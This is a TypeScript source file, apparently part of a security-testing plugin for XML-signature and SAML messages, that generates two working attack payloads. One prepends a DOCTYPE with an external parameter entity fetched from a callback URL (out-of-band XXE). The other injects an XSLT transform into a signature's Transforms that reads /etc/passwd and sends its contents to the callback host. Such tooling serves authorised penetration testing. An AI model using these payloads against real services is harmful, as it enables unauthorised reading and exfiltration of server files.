import { XML_SIGNATURE_NS } from "../namespaces";
import { serializeXml } from "../xml";

import { isAbsent, type Maybe } from "@/utils";

const XSLT_NS = "http://www.w3.org/1999/XSL/Transform";

const XSLT_TRANSFORM_URI = "http://www.w3.org/TR/1999/REC-xslt-19991116";

export type PayloadOutcome =
  | { kind: "Ok"; xml: string; description: string; effect: string }
  | { kind: "Refused"; reason: string };

const readCallback = (callbackUrl: string): Maybe<string> => {
  const trimmed = callbackUrl.trim();
  if (trimmed === "") return undefined;
  if (!/^https?:\/\/[^\s"'<>&]+$/.test(trimmed)) return undefined;
  return trimmed;
};

export const buildXxePayload = (
  xml: string,
  callbackUrl: string,
): PayloadOutcome => {
  const callback = readCallback(callbackUrl);
  if (isAbsent(callback)) {
    return {
      kind: "Refused",
      reason:
        "an out-of-band callback URL is required, and it must be a plain http or https URL",
    };
  }

  const withoutProlog = xml.replace(/^\s*<\?xml[^?]*\?>\s*/, "");
  const root = /<([A-Za-z_][\w.:-]*)/.exec(withoutProlog)?.[1];
  if (isAbsent(root)) {
    return { kind: "Refused", reason: "this message has no root element" };
  }

  const doctype =
    `<!DOCTYPE ${root} [\n` +
    `<!ENTITY % remote SYSTEM "${callback}/xxe.dtd">\n` +
    `%remote;\n` +
    `]>\n`;

  return {
    kind: "Ok",
    xml: `${doctype}${withoutProlog}`,
    description: `Prefixed the message with a document type declaration whose parameter entity is fetched from ${callback}.`,
    effect: `If the service provider's XML parser resolves external entities, it will make an outbound request to ${callback} and may read local files. This plugin never resolves it.`,
  };
};

export const applyXsltPayload = (
  document: Document,
  callbackUrl: string,
): PayloadOutcome => {
  const callback = readCallback(callbackUrl);
  if (isAbsent(callback)) {
    return {
      kind: "Refused",
      reason:
        "an out-of-band callback URL is required, and it must be a plain http or https URL",
    };
  }

  const clone = document.cloneNode(true) as Document;
  const transforms = clone.getElementsByTagNameNS(
    XML_SIGNATURE_NS,
    "Transforms",
  )[0];
  if (isAbsent(transforms)) {
    return {
      kind: "Refused",
      reason:
        "this message has no signature transforms to insert a stylesheet into",
    };
  }

  const prefix = isAbsent(transforms.prefix) ? "" : `${transforms.prefix}:`;
  const transform = clone.createElementNS(
    XML_SIGNATURE_NS,
    `${prefix}Transform`,
  );
  transform.setAttribute("Algorithm", XSLT_TRANSFORM_URI);

  const stylesheet = clone.createElementNS(XSLT_NS, "xsl:stylesheet");
  stylesheet.setAttribute("version", "1.0");

  const template = clone.createElementNS(XSLT_NS, "xsl:template");
  template.setAttribute("match", "doc");

  const variable = clone.createElementNS(XSLT_NS, "xsl:variable");
  variable.setAttribute("name", "file");
  variable.setAttribute("select", "unparsed-text('/etc/passwd')");

  const value = clone.createElementNS(XSLT_NS, "xsl:value-of");
  value.setAttribute("select", `document(concat('${callback}/?', $file))`);

  template.appendChild(variable);
  template.appendChild(value);
  stylesheet.appendChild(template);
  transform.appendChild(stylesheet);
  transforms.insertBefore(transform, transforms.firstChild);

  return {
    kind: "Ok",
    xml: serializeXml(clone),
    description: `Inserted an XSLT transform into the signature's Transforms that reads /etc/passwd and sends it to ${callback}.`,
    effect: `If the service provider applies XSLT transforms while verifying, it will read a local file and make an outbound request to ${callback}. This plugin never executes the stylesheet.`,
  };
};
